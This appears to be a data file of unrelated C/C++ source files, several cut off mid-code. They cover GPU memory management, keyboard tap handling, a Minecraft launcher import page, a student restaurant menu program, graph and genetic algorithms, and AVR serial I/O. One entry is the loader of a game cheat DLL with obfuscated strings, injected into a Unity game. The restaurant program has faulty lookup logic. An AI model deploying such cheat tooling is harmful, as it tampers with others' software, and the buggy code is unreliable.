    "#include \"GpuMemoryAllocator.hpp\"\n\n#include <cassert>\n\n#include \"ErrorHandling.hpp\"\n#include \"GpuSystem.hpp\"\n\nnamespace\n{\n    constexpr uint32_t PageSize = 2 * 1024 * 1024;\n    constexpr uint32_t SegmentSize = 512;\n    constexpr uint32_t SegmentMask = SegmentSize - 1;\n} // namespace\n\nnamespace MotionToGo\n{\n    GpuMemoryPage::GpuMemoryPage(GpuSystem& gpu_system, bool is_upload, uint32_t size_in_bytes) : is_upload_(is_upload)\n    {\n        D3D12_RESOURCE_STATES init_state;\n        D3D12_HEAP_TYPE heap_type;\n        if (is_upload_)\n        {\n            heap_type = D3D12_HEAP_TYPE_UPLOAD;\n            init_state = D3D12_RESOURCE_STATE_COMMON;\n        }\n        else\n        {\n            heap_type = D3D12_HEAP_TYPE_READBACK;\n            init_state = D3D12_RESOURCE_STATE_COPY_DEST;\n        }\n\n        buffer_ = GpuBuffer(gpu_system, size_in_bytes, heap_type, D3D12_RESOURCE_FLAG_NONE, init_state, L\"GpuMemoryPage\");\n        cpu_addr_ = buffer_.Map();\n        gpu_addr_ = buffer_.GpuVirtualAddress();\n    }\n\n    GpuMemoryPage::~GpuMemoryPage() noexcept\n    {\n        if (buffer_)\n        {\n            buffer_.Unmap();\n        }\n    }\n\n    GpuMemoryPage::GpuMemoryPage(GpuMemoryPage&& other) noexcept\n        : is_upload_(other.is_upload_), buffer_(std::move(other.buffer_)), cpu_addr_(std::move(other.cpu_addr_)),\n          gpu_addr_(std::move(other.gpu_addr_))\n    {\n    }\n\n    GpuMemoryPage& GpuMemoryPage::operator=(GpuMemoryPage&& other) noexcept\n    {\n        if (this != &other)\n        {\n            assert(is_upload_ == other.is_upload_);\n\n            buffer_ = std::move(other.buffer_);\n            cpu_addr_ = std::move(other.cpu_addr_);\n            gpu_addr_ = std::move(other.gpu_addr_);\n        }\n        return *this;\n    }\n\n\n    GpuMemoryBlock::GpuMemoryBlock() noexcept = default;\n    GpuMemoryBlock::GpuMemoryBlock(GpuMemoryBlock&& other) noexcept = default;\n    GpuMemoryBlock& GpuMemoryBlock::operator=(GpuMemoryBlock&& other) noexcept = default;\n\n    void GpuMemoryBlock::Reset() noexcept\n    {\n        native_buffer_ = nullptr;\n        offset_ = 0;\n        size_ = 0;\n        cpu_addr_ = nullptr;\n        gpu_addr_ = {};\n    }\n\n    void GpuMemoryBlock::Reset(const GpuMemoryPage& page, uint32_t offset, uint32_t size) noexcept\n    {\n        native_buffer_ = page.Buffer().NativeBuffer();\n        offset_ = offset;\n        size_ = size;\n        cpu_addr_ = page.CpuAddress<uint8_t>() + offset;\n        gpu_addr_ = page.GpuAddress() + offset;\n    }\n\n\n    GpuMemoryAllocator::GpuMemoryAllocator(GpuSystem& gpu_system, bool is_upload) noexcept : gpu_system_(&gpu_system), is_upload_(is_upload)\n    {\n    }\n\n    GpuMemoryAllocator::GpuMemoryAllocator(GpuMemoryAllocator&& other) noexcept\n        : gpu_system_(std::move(other.gpu_system_)), is_upload_(other.is_upload_), pages_(std::move(other.pages_)),\n          large_pages_(std::move(other.large_pages_))\n    {\n    }\n\n    GpuMemoryAllocator& GpuMemoryAllocator::operator=(GpuMemoryAllocator&& other) noexcept\n    {\n        if (this != &other)\n        {\n            assert(is_upload_ == other.is_upload_);\n\n            gpu_system_ = std::move(other.gpu_system_);\n            pages_ = std::move(other.pages_);\n            large_pages_ = std::move(other.large_pages_);\n        }\n        return *this;\n    }\n\n    GpuMemoryBlock GpuMemoryAllocator::Allocate(uint32_t size_in_bytes, uint32_t alignment)\n    {\n        std::lock_guard<std::mutex> lock(allocation_mutex_);\n\n        GpuMemoryBlock mem_block;\n        this->Allocate(lock, mem_block, size_in_bytes, alignment);\n        return mem_block;\n    }\n\n    void GpuMemoryAllocator::Allocate(\n        [[maybe_unused]] std::lock_guard<std::mutex>& proof_of_lock, GpuMemoryBlock& mem_block, uint32_t size_in_bytes, uint32_t alignment)\n    {\n        assert(alignment <= SegmentSize);\n        const uint32_t aligned_size = ((size_in_bytes + alignment - 1) / alignment * alignment + SegmentMask) & ~SegmentMask;\n\n        if (aligned_size > PageSize)\n        {\n            auto& large_page = large_pages_.emplace_back(GpuMemoryPage(*gpu_system_, is_upload_, aligned_size));\n            mem_block.Reset(large_page, 0, size_in_bytes);\n            return;\n        }\n\n        for (auto& page_info : pages_)\n        {\n            const auto iter = std::lower_bound(page_info.free_list.begin(), page_info.free_list.end(), aligned_size,\n                [](const PageInfo::FreeRange& free_range, uint32_t s) { return free_range.first_offset + s > free_range.last_offset; });\n            if (iter != page_info.free_list.end())\n            {\n                const uint32_t aligned_offset = (iter->first_offset + alignment - 1) / alignment * alignment;\n                mem_block.Reset(page_info.page, aligned_offset, size_in_bytes);\n                iter->first_offset += aligned_size;\n                if (iter->first_offset == iter->last_offset)\n                {\n                    page_info.free_list.erase(iter);\n                }\n\n                return;\n            }\n        }\n\n        GpuMe",
    "/*\n*  TapDance.cpp\n*\n*  MIT License\n*\n*  Copyright (c) 2024 Shubham Patel\n*\n*  Permission is hereby granted, free of charge, to any person obtaining a copy\n*  of this software and associated documentation files (the \"Software\"), to deal\n*  in the Software without restriction, including without limitation the rights\n*  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n*  copies of the Software, and to permit persons to whom the Software is\n*  furnished to do so, subject to the following conditions:\n*\n*  The above copyright notice and this permission notice shall be included in all\n*  copies or substantial portions of the Software.\n*\n*  THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n*  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n*  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n*  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n*  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n*  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n*  SOFTWARE.\n*/\n\n#include \"TapDance.h\"\n\nTapDance::TapDance() {}\n\nvoid TapDance::keyPressed(int keyIndex) {\n  keyState = &keyStates[keyIndex];\n\n  keyState->pressed = true;\n  keyState->lastClickedMs = millis();\n  keyState->singleClickCounter += 1;\n}\n\nvoid TapDance::keyReleased(int keyIndex) {\n  keyState = &keyStates[keyIndex];\n\n  keyState->pressed = false;\n  keyState->lastClickedMs = millis();\n  if (keyState->longPressed) {\n    keyState->longPressed = false;\n  }\n}\n\nvoid TapDance::tick() {\n  if (eventHandler == NULL || keyState == nullptr) {\n    return;\n  }\n\n  for (int key = 0; key < totalKeys; key++) {\n    keyState = &keyStates[key];\n    unsigned long duration = millis() - keyState->lastClickedMs;\n\n    if (keyState->singleClickCounter > 0 && !keyState->pressed && duration >= SinglePressDuration) {\n      if (keyState->singleClickCounter == 1) eventHandler(key, SINGLE_PRESS);       // Single\n      else if (keyState->singleClickCounter == 2) eventHandler(key, DOUBLE_PRESS);  // Double\n\n      keyState->singleClickCounter = 0;\n    } else if (!keyState->longPressed && keyState->pressed && duration >= LongPressDuration) {\n      eventHandler(key, LONG_PRESS);  // Long Press\n\n      keyState->longPressed = true;\n      keyState->singleClickCounter = 0;\n    }\n  }\n}",
    "// SPDX-License-Identifier: GPL-3.0-only\n/*\n *  Prism Launcher - Minecraft Launcher\n *  Copyright (c) 2023 Trial97 <alexandru.tripon97@gmail.com>\n *\n *  This program is free software: you can redistribute it and/or modify\n *  it under the terms of the GNU General Public License as published by\n *  the Free Software Foundation, version 3.\n *\n *  This program is distributed in the hope that it will be useful,\n *  but WITHOUT ANY WARRANTY; without even the implied warranty of\n *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n *  GNU General Public License for more details.\n *\n *  You should have received a copy of the GNU General Public License\n *  along with this program.  If not, see <https://www.gnu.org/licenses/>.\n */\n\n#include \"ImportFTBPage.h\"\n#include \"ui/widgets/ProjectItem.h\"\n#include \"ui_ImportFTBPage.h\"\n\n#include <QFileDialog>\n#include <QWidget>\n#include \"FileSystem.h\"\n#include \"ListModel.h\"\n#include \"modplatform/import_ftb/PackInstallTask.h\"\n#include \"ui/dialogs/NewInstanceDialog.h\"\n\nnamespace FTBImportAPP {\n\nImportFTBPage::ImportFTBPage(NewInstanceDialog* dialog, QWidget* parent) : QWidget(parent), dialog(dialog), ui(new Ui::ImportFTBPage)\n{\n    ui->setupUi(this);\n\n    {\n        currentModel = new FilterModel(this);\n        listModel = new ListModel(this);\n        currentModel->setSourceModel(listModel);\n\n        ui->modpackList->setModel(currentModel);\n        ui->modpackList->setSortingEnabled(true);\n        ui->modpackList->header()->hide();\n        ui->modpackList->setIndentation(0);\n        ui->modpackList->setIconSize(QSize(42, 42));\n\n        for (int i = 0; i < currentModel->getAvailableSortings().size(); i++) {\n            ui->sortByBox->addItem(currentModel->getAvailableSortings().keys().at(i));\n        }\n\n        ui->sortByBox->setCurrentText(currentModel->translateCurrentSorting());\n    }\n\n    connect(ui->modpackList->selectionModel(), &QItemSelectionModel::currentChanged, this, &ImportFTBPage::onPublicPackSelectionChanged);\n\n    connect(ui->sortByBox, &QComboBox::currentTextChanged, this, &ImportFTBPage::onSortingSelectionChanged);\n\n    connect(ui->searchEdit, &QLineEdit::textChanged, this, &ImportFTBPage::triggerSearch);\n\n    connect(ui->browseButton, &QPushButton::clicked, this, [this] {\n        auto path = listModel->getPath();\n        QString dir = QFileDialog::getExistingDirectory(this, tr(\"Select FTBApp instances directory\"), path, QFileDialog::ShowDirsOnly);\n        if (!dir.isEmpty())\n            listModel->setPath(dir);\n    });\n\n    ui->modpackList->setItemDelegate(new ProjectItemDelegate(this));\n    ui->modpackList->selectionModel()->reset();\n}\n\nImportFTBPage::~ImportFTBPage()\n{\n    delete ui;\n}\n\nvoid ImportFTBPage::openedImpl()\n{\n    if (!initialized) {\n        listModel->update();\n        initialized = true;\n    }\n    suggestCurrent();\n}\n\nvoid ImportFTBPage::retranslate()\n{\n    ui->retranslateUi(this);\n}\n\nvoid ImportFTBPage::suggestCurrent()\n{\n    if (!isOpened)\n        return;\n\n    if (selected.path.isEmpty()) {\n        dialog->setSuggestedPack();\n        return;\n    }\n\n    dialog->setSuggestedPack(selected.name, new PackInstallTask(selected));\n    QString editedLogoName = QString(\"ftb_%1_%2.jpg\").arg(selected.name, QString::number(selected.id));\n    dialog->setSuggestedIconFromFile(FS::PathCombine(selected.path, \"folder.jpg\"), editedLogoName);\n}\n\nvoid ImportFTBPage::onPublicPackSelectionChanged(QModelIndex now, QModelIndex prev)\n{\n    if (!now.isValid()) {\n        onPackSelectionChanged();\n        return;\n    }\n    Modpack selectedPack = currentModel->data(now, Qt::UserRole).value<Modpack>();\n    onPackSelectionChanged(&selectedPack);\n}\n\nvoid ImportFTBPage::onPackSelectionChanged(Modpack* pack)\n{\n    if (pack) {\n        selected = *pack;\n        suggestCurrent();\n        return;\n    }\n    if (isOpened)\n        dialog->setSuggestedPack();\n}\n\nvoid ImportFTBPage::onSortingSelectionChanged(QString sort)\n{\n    FilterModel::Sorting toSet = currentModel->getAvailableSortings().value(sort);\n    currentModel->setSorting(toSet);\n}\n\nvoid ImportFTBPage::triggerSearch()\n{\n    currentModel->setSearchTerm(ui->searchEdit->text());\n}\n\n}  // namespace FTBImportAPP\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\nusing namespace std;\r\n\r\n//Global Variabels\r\nfloat total_price=0;\r\nfloat capital=10000;\r\nclass restaurant_face\r\n{\r\npublic:\r\n    void restaurant()\r\n    {\r\n       string outputprint = \"HELLO our working hours are every day except for prayer times\\n\";\r\n        outputprint += \"There is an additional amount to deliver the product varies from place to place\\n\";\r\n        outputprint += \"*-*-*-*-*-* Menu *-*-*-*-*-*\\n\";\r\n        outputprint += \"* Appetizers:\\n\";\r\n        outputprint += \"1- Spring Rolls: $ 5.99\\n2- Chicken Wings: $ 8.99\\n3- Bruschetta: $6.49\\n\";\r\n        outputprint += \"* Soups:\\n\";\r\n        outputprint += \"4- Tomato Soup: $ 4.99\\n5-Chicken Noodle Soup: $ 5.49\\n6- Lentil Soup: $4.99\\n\";\r\n        outputprint += \"*Salads:\\n\";\r\n        outputprint += \"7- Caesar Salad: $ 7.99\\n8- Greek Salad: $ 8.49\\n9- Caprese Salad: $ 6.99\\n\";\r\n        outputprint += \"*Main Courses:\\n\";\r\n        outputprint += \"10-Grilled Steak with Mashed Potatoes: $ 18.99\\n11-Vegetable Stir-Fry with Tofu: $ 12.99\\n\";\r\n        outputprint += \"*Pasta:\\n\";\r\n        outputprint += \"12-Penne Arrabbiata: $ 9.99\\n13-Spaghetti Bolognese: $ 11.99\\n\";\r\n        outputprint += \"*Pizza:\\n\";\r\n        outputprint += \"14-Margherita Pizza: $ 12.99\\n15-Vegetarian Pizza: $ 11.99\\n\";\r\n        outputprint += \" *Sandwiches:\\n\";\r\n        outputprint += \"16-Philly Cheesesteak Sandwich: $ 11.49\\n17-Grilled Chicken Panini: $ 10.99\\n\";\r\n        outputprint += \"* Beverages:\\n\";\r\n        outputprint += \"18-Coffee (Espresso, Cappuccino, Latte): $ 3.49\\n19-Soft Drinks (Coke, Pepsi, Sprite): $ 2.49\\n\";\r\n        outputprint +=\"*Desserts:\\n\";\r\n        outputprint +=\"20-Chocolate Cake: $ 6.99\\n21-Apple Pie: $ 5.99\\n22- Tiramisu: $ 7.49\\n\";\r\n\r\n\r\n         fstream file(\"restaurant.txt\");\r\n    file.close();\r\n\r\n\r\n    ifstream file_read(\"restaurant.txt\");\r\n    if (!file_read.is_open()) {\r\n        cout << \"Unable to open file\" << endl;\r\n    }\r\n\r\n    //in the menu there is a unique charactares like *\r\n    //output print += \"*-*-*-*-*-* Menu *-*-*-*-*-*\\n\";\r\n    //when the complier find the * it converts the check menu to true\r\n    char targetChar = '*';\r\n    char ch;\r\n    bool checkMenu = false;\r\n\r\n    while (file_read.get(ch))\r\n\t      {\r\n\t        if (ch == targetChar)\r\n\t\t\t   {\r\n\t            checkMenu = true;\r\n\t            break;\r\n\t           }\r\n          }\r\n\r\n    file_read.close();\r\n//check if the menu is created ,if so don't create another one.\r\n    if (!checkMenu)\r\n\t {\r\n        ofstream file_write(\"restaurant.txt\", ios::app);\r\n        file_write << outputprint;\r\n        file_write.close();\r\n     }\r\n    }\r\n};\r\n\r\nclass Owner\r\n{\r\nprivate:\r\n    string name;\r\n\r\npublic:\r\n    Owner( string n) : name(n) {}\r\n\r\n    int NumOfMeals ;\r\n    string itemName ;\r\n    float itemPrice ;\r\n\r\n   void addFoodItem() {\r\n    int t;\r\n    cout << \"Enter number of meals you want to add: \";\r\n    cin >> t;\r\n    ofstream file(\"restaurant.txt\", ios::app);\r\n    if (!file.is_open())\r\n       {\r\n        cout << \"Error: Unable to open file!\" << endl;\r\n       return;\r\n       }\r\n       while (t--) {\r\n\r\n        cout << \"Enter the number of the meal in menu: \";\r\n        cin >> NumOfMeals;\r\n\r\n        while (NumOfMeals!=0)\r\n            {\r\n     ifstream file(\"restaurant.txt\");\r\n     string line;\r\n     bool found2 = false;\r\n\r\n\r\n         while (getline(file, line)) {\r\n            if (line.find((NumOfMeals) + \"-\")) {\r\n               found2 = true;\r\n                 break;\r\n            }\r\n         }\r\n              if(!found2)\r\n          {\r\n            cout << \"The number is already in the menu.\"<<endl << \"Please enter another number:\" ;\r\n             cin >> NumOfMeals;\r\n          }\r\n          else break;\r\n        file.close();\r\n        }\r\n        cout << \"Enter the name of the meal: \";\r\n        cin >> itemName;\r\n        cout << \"Enter the price of the meal: \";\r\n        cin >> itemPrice;\r\n\r\n        ofstream outfile(\"restaurant.txt\", ios::app);\r\n        outfile << NumOfMeals << \"-\" << itemName << \": $\" << itemPrice << endl;\r\n        outfile.close();\r\n    }\r\n\r\n    cout << \"\\nDone! All meals added to the menu successfully.\" << endl;\r\n   }\r\n\r\n    void displayOwnerInfo() {\r\n        cout << \"\\nOwner Name: \" << name << endl;\r\n        cout << \"Capital: $\" << capital << endl;\r\n\r\n        cout<<\"\\nDone \"<<itemName << \": $\" << itemPrice << \" Added to menu Succesfully\" <<endl;\r\n    }\r\n};\r\n\r\nclass customer {\r\nprivate:\r\n    string customername;\r\n\r\n    // These static variables are used to track the writing state for customer names in text files.\r\n    static bool namewritten;\r\n    static bool namewrittenagain;\r\n    static bool firstcustomer;\r\n    static bool firstcustomeragain;\r\npublic:\r\n    customer()\r\n        {\r\n        //we used trunc method to delete lastcustomer txt file and update it every time\r\n        //to not conflict\r\n        fstream customerorder_clear(\"lastcustomer.txt\", ios::out | ios::trunc);\r\n        customerorder_clear.close();\r\n        }\r\n\r\n    //setter and gette",
    "#include \"GpuResourceViews.hpp\"\n\n#include \"GpuSystem.hpp\"\n#include \"GpuTexture2D.hpp\"\n\nnamespace MotionToGo\n{\n    GpuShaderResourceView::GpuShaderResourceView() noexcept = default;\n\n    GpuShaderResourceView::GpuShaderResourceView(GpuSystem& gpu_system, const GpuTexture2D& texture, D3D12_CPU_DESCRIPTOR_HANDLE cpu_handle)\n        : GpuShaderResourceView(gpu_system, texture, DXGI_FORMAT_UNKNOWN, cpu_handle)\n    {\n    }\n\n    GpuShaderResourceView::GpuShaderResourceView(\n        GpuSystem& gpu_system, const GpuTexture2D& texture, DXGI_FORMAT format, D3D12_CPU_DESCRIPTOR_HANDLE cpu_handle)\n        : cpu_handle_(cpu_handle)\n    {\n        D3D12_SHADER_RESOURCE_VIEW_DESC srv_desc{};\n        srv_desc.Format = (format == DXGI_FORMAT_UNKNOWN) ? texture.Format() : format;\n        srv_desc.ViewDimension = D3D12_SRV_DIMENSION_TEXTURE2D;\n        srv_desc.Shader4ComponentMapping = D3D12_DEFAULT_SHADER_4_COMPONENT_MAPPING;\n        srv_desc.Texture2D.MostDetailedMip = 0;\n        srv_desc.Texture2D.MipLevels = texture.MipLevels();\n        srv_desc.Texture2D.PlaneSlice = 0;\n        srv_desc.Texture2D.ResourceMinLODClamp = 0;\n        gpu_system.NativeDevice()->CreateShaderResourceView(texture.NativeTexture(), &srv_desc, cpu_handle);\n    }\n\n    GpuShaderResourceView::GpuShaderResourceView(\n        GpuSystem& gpu_system, const GpuTexture2D& texture, uint32_t sub_resource, D3D12_CPU_DESCRIPTOR_HANDLE cpu_handle)\n        : GpuShaderResourceView(gpu_system, texture, sub_resource, DXGI_FORMAT_UNKNOWN, cpu_handle)\n    {\n    }\n\n    GpuShaderResourceView::GpuShaderResourceView(GpuSystem& gpu_system, const GpuTexture2D& texture, uint32_t sub_resource,\n        DXGI_FORMAT format, D3D12_CPU_DESCRIPTOR_HANDLE cpu_handle)\n        : cpu_handle_(cpu_handle)\n    {\n        D3D12_SHADER_RESOURCE_VIEW_DESC srv_desc{};\n        srv_desc.Format = (format == DXGI_FORMAT_UNKNOWN) ? texture.Format() : format;\n        srv_desc.ViewDimension = D3D12_SRV_DIMENSION_TEXTURE2D;\n        srv_desc.Shader4ComponentMapping = D3D12_DEFAULT_SHADER_4_COMPONENT_MAPPING;\n        SubResourceToMipLevelPlane(sub_resource, texture.MipLevels(), srv_desc.Texture2D.MostDetailedMip, srv_desc.Texture2D.PlaneSlice);\n        srv_desc.Texture2D.MipLevels = 1;\n        srv_desc.Texture2D.ResourceMinLODClamp = 0;\n        gpu_system.NativeDevice()->CreateShaderResourceView(texture.NativeTexture(), &srv_desc, cpu_handle);\n    }\n\n    GpuShaderResourceView::~GpuShaderResourceView() noexcept = default;\n    GpuShaderResourceView::GpuShaderResourceView(GpuShaderResourceView&& other) noexcept = default;\n    GpuShaderResourceView& GpuShaderResourceView::operator=(GpuShaderResourceView&& other) noexcept = default;\n\n    GpuShaderResourceView::operator bool() const noexcept\n    {\n        return (cpu_handle_.ptr != 0);\n    }\n\n    void GpuShaderResourceView::Reset() noexcept\n    {\n        cpu_handle_ = {};\n    }\n\n\n    GpuUnorderedAccessView::GpuUnorderedAccessView() noexcept = default;\n\n    GpuUnorderedAccessView::GpuUnorderedAccessView(\n        GpuSystem& gpu_system, const GpuTexture2D& texture, D3D12_CPU_DESCRIPTOR_HANDLE cpu_handle)\n        : GpuUnorderedAccessView(gpu_system, texture, DXGI_FORMAT_UNKNOWN, cpu_handle)\n    {\n    }\n\n    GpuUnorderedAccessView::GpuUnorderedAccessView(\n        GpuSystem& gpu_system, const GpuTexture2D& texture, DXGI_FORMAT format, D3D12_CPU_DESCRIPTOR_HANDLE cpu_handle)\n        : GpuUnorderedAccessView(gpu_system, texture, 0, format, cpu_handle)\n    {\n    }\n\n    GpuUnorderedAccessView::GpuUnorderedAccessView(\n        GpuSystem& gpu_system, const GpuTexture2D& texture, uint32_t sub_resource, D3D12_CPU_DESCRIPTOR_HANDLE cpu_handle)\n        : GpuUnorderedAccessView(gpu_system, texture, sub_resource, DXGI_FORMAT_UNKNOWN, cpu_handle)\n    {\n    }\n\n    GpuUnorderedAccessView::GpuUnorderedAccessView(GpuSystem& gpu_system, const GpuTexture2D& texture, uint32_t sub_resource,\n        DXGI_FORMAT format, D3D12_CPU_DESCRIPTOR_HANDLE cpu_handle)\n        : cpu_handle_(cpu_handle)\n    {\n        D3D12_UNORDERED_ACCESS_VIEW_DESC uav_desc{};\n        uav_desc.Format = format == DXGI_FORMAT_UNKNOWN ? texture.Format() : format;\n        uav_desc.ViewDimension = D3D12_UAV_DIMENSION_TEXTURE2D;\n        SubResourceToMipLevelPlane(sub_resource, texture.MipLevels(), uav_desc.Texture2D.MipSlice, uav_desc.Texture2D.PlaneSlice);\n        gpu_system.NativeDevice()->CreateUnorderedAccessView(texture.NativeTexture(), nullptr, &uav_desc, cpu_handle);\n    }\n\n    GpuUnorderedAccessView::~GpuUnorderedAccessView() noexcept = default;\n    GpuUnorderedAccessView::GpuUnorderedAccessView(GpuUnorderedAccessView&& other) noexcept = default;\n    GpuUnorderedAccessView& GpuUnorderedAccessView::operator=(GpuUnorderedAccessView&& other) noexcept = default;\n\n    GpuUnorderedAccessView::operator bool() const noexcept\n    {\n        return (cpu_handle_.ptr != 0);\n    }\n\n    void GpuUnorderedAccessView::Reset() noexcept\n    {\n        cpu_handle_ = {};\n    }\n} // namespace MotionToGo\n",
    "\ufeff#include \"main.h\"\n#include <Utils.h>\n#include \"ConfigManager.hpp\"\n#include \"appdata/helpers.h\"\n#include \"appdata/il2cpp-init.h\"\n#include \"cheat/cheat.h\"\n#include \"Render/Renderer.h\"\n#include \"UnityResolve.hpp\"\n\nvoid Run(HMODULE hModule)\n{\n\tUtils::PrepareFileLogging((Utils::GetCurrentPath() / \"logs\").string());\n\til2cppi_new_console();\n\t\n\twhile (!GetModuleHandleA(xorstr(\"GameAssembly.dll\")) &&\n\t\t!FindWindowA(xorstr(\"UnityWndClass\"), nullptr))\n\t{\n\t\tLOG(xorstr(\"[AFKJ-Cheeto] game not found, waiting 3 seconds...\"));\n\t\tSleep(3000);\n\t}\n\n\tUtils::SetCurrentPath(Utils::GetModulePath(hModule));\n\tConfigManager::GetInstance().InitializeConfig((Utils::GetCurrentPath() / \"config.json\").string());\n\t\n\tInit(Renderer::DXVersion::D3D11);\n\n\t// TODO: Use UnityResolve for automatic updates\n\t// UnityResolve::Init(GetModuleHandleA(xorstr(\"GameAssembly.dll\")), UnityResolve::Mode::Il2Cpp);\n\n\tinit_il2cpp();\n\tinit_cheat();\n\n\tLOG(xorstr(\"Config path is at %s\"), (Utils::GetCurrentPath() / xorstr(\"config.json\")).string().c_str());\n}\n",
    "#include <bits/stdc++.h>\n#include <queue>\n\nclass Edge {\npublic:\n  int source;\n  int dest;\n  int weight;\n};\n\nint findParent(int v, int *parent) {\n  if (parent[v] == v) {\n    return v;\n  }\n  return findParent(parent[v], parent);\n}\nstruct Compare_Edge {\n  bool operator()(const Edge &e1, const Edge &e2) {\n    return e1.weight > e2.weight;\n  }\n};\n\nvoid Kruskal(Edge *input, int n, int E) {\n  std::priority_queue<Edge, std::vector<Edge>, Compare_Edge> pq;\n\n  for (int i = 0; i < E; i++) {\n    pq.push(input[i]);\n  }\n\n  Edge *output = new Edge[n - 1];\n  int *parent = new int[n];\n\n  for (int i = 0; i < n; i++) {\n    parent[i] = i;\n  }\n\n  int count = 0;\n\n  while (count != n - 1 && !pq.empty()) {\n    Edge currentEdge = pq.top();\n    pq.pop();\n\n    // Check if we can add the currentEdge in MST or not\n    int sourceParent = findParent(currentEdge.source, parent);\n    int destParent = findParent(currentEdge.dest, parent);\n\n    if (sourceParent != destParent) {\n      output[count] = currentEdge;\n      count++;\n      parent[sourceParent] = destParent;\n    }\n  }\n\n  int minWeight = 0;\n\n  std::cout << std::endl;\n  std::cout << \"The MST will be: \" << std::endl;\n\n  for (int i = 0; i < n - 1; i++) {\n    std::cout << std::endl;\n    if (output[i].source < output[i].dest) {\n      std::cout << output[i].source << \" \" << output[i].dest << \" \"\n                << output[i].weight << std::endl;\n\n      minWeight += output[i].weight;\n    } else {\n      std::cout << output[i].dest << \" \" << output[i].source << \" \"\n                << output[i].weight << std::endl;\n\n      minWeight += output[i].weight;\n    }\n  }\n\n  std::cout << std::endl;\n  std::cout << \"The Total value will be: \" << minWeight << std::endl;\n}\n\nint main() {\n  int n, E;\n  std::cout << \"Enter the number of vertices: \";\n  std::cin >> n;\n  std::cout << \"Enter the number of Edges: \";\n  std::cin >> E;\n\n  Edge *input = new Edge[E];\n\n  std::cout << \"Enter source , destination and Weight in that order: \"\n            << std::endl;\n\n  for (int i = 0; i < E; i++) {\n    int s, d, w;\n    std::cin >> s >> d >> w;\n    input[i].source = s;\n    input[i].dest = d;\n    input[i].weight = w;\n  }\n\n  Kruskal(input, n, E);\n}\n",
    "#include \"usart.h\"\n#include <avr/io.h> // Include here if avr/io.h is needed for USART functions\n#include \"bit.h\"\n\n#include <stdlib.h>\n\n// Set the baud rate\nvoid usart_init(unsigned int ubrr)\n{\n  UBRR0H = (unsigned char)(ubrr >> 8);\n  UBRR0L = (unsigned char)ubrr;\n  // enable receiver and transmitter\n  UCSR0B = (1 << TXEN0) | (1 << RXEN0);\n  // set frame format: USBS0 = 0b1 2stop bit, UCSZ00 = 0b11 8bit data,\n  UCSR0C = (1 << USBS0) | (3 << UCSZ00);\n}\n\nvoid usart_transmit(unsigned char data)\n{\n  /* Wait for empty transmit buffer */\n  while (!(UCSR0A & (1 << UDRE0)))\n    ;\n  /* Put data into buffer, sends the data */\n  UDR0 = data;\n}\n\nvoid usart_tx_string(const char *pStr)\n{\n  while (*pStr != '\\0')\n  {\n    usart_transmit(*pStr);\n    pStr++;\n  }\n}\n\nvoid usart_tx_float(float x, char num_digits_int, char num_digits_decimal)\n{\n  char num_elements = num_digits_int + num_digits_decimal + 1 + 1; // one decimal point and one null terminator\n  char buffer[num_elements];\n\n  dtostrf(x, num_elements - 1, num_digits_decimal, buffer);\n  buffer[num_elements - 1] = '\\0';\n  usart_tx_string(buffer);\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <cmath>\n#include <vector>\n#include <algorithm>\n#include <set>\n#include <random>\n#include <numeric>\n\nconstexpr int POPULATION_SIZE = 1000;\nconstexpr int MAX_GENERATIONS = 10000;\nconstexpr double MUTATION_RATE = 0.7;\nconstexpr double MIN_VAL = 0.0;\nconstexpr double MAX_VAL = 1.0;\n\n// Use random number engine for better random number generation\nstd::random_device rd;\nstd::mt19937 gen(rd());\n\ndouble randVal(double min_val_, double max_val_)\n{\n    std::uniform_real_distribution<double> dis(min_val_, max_val_);\n    return dis(gen);\n}\n\n// The problem to optimize\ndouble foo(const double & x, const double & y, const double & z)\n{\n    return fabs(6 * pow(x, 3) + 9 * pow(y, 2) + 90 * z - 25);\n}\n\n// 2. Fitness Evaluation - Evaluate the fitness of each solution in the population based on some predefined criteria\ndouble fitnessEval(const double & x, const double & y, const double & z)\n{\n    double ans = foo(x, y, z);\n    return (ans == 0) ? INT_MAX : fabs(1 / ans);\n}\n\n// A potential solution\nstruct Solution\n{\n    double x, y, z;\n\tdouble fitness;\n\n    Solution() = default;\n\n    Solution(const double & x_, const double & y_, const double & z_)\n        : x(x_)\n        , y(y_)\n        , z(z_)\n        , fitness(fitnessEval(x_, y_, z_)) {}\n\n    bool operator>(const Solution & other) const\n    {\n        return fitness > other.fitness;\n    }\n\n    friend std::ostream & operator<<(std::ostream & os, const Solution & obj)\n    {\n        os << \"x = \" << obj.x << \", \"\n           << \"y = \" << obj.y << \", \"\n           << \"z = \" << obj.z << \", \"\n           << \"Fitness = \" << obj.fitness;\n        return os;\n    }\n};\n\n// 1. Initialization - Generate an initial population of potential solutions randomly\nvoid initPopulation(std::vector<Solution> & population)\n{\n\tfor (int i = 0; i < POPULATION_SIZE; ++i)\n\t{\n        population[i] = Solution(randVal(MIN_VAL, MAX_VAL), randVal(MIN_VAL, MAX_VAL), randVal(MIN_VAL, MAX_VAL));\n\t}\n}\n\n// 3. Selection - Select individuals from the current population based on their fitness, favoring better individuals\nvoid selection(std::vector<Solution> & population)\n{\n    population.resize((size_t)(std::ceil(population.size() * 0.6)));\n}\n\n// 4. Recombination (Crossover) - Create new solutions by combining genetic material from selected individuals\nSolution crossover(const Solution & parent1, const Solution & parent2)\n{\n    Solution child((parent1.x + parent2.x) / 2.0, (parent1.y + parent2.y) / 2.0, (parent1.z + parent2.z) / 2.0);\n    return child;\n}\n\n// 5. Mutation - Introduce random changes in the new solutions to maintain genetic diversity and explore new regions of the solution space\nvoid mutate(Solution & child)\n{\n    if (randVal(0, 1) < MUTATION_RATE)\n    {\n        child.x *= randVal(0.99, 1.01);\n        child.y *= randVal(0.99, 1.01);\n        child.z *= randVal(0.99, 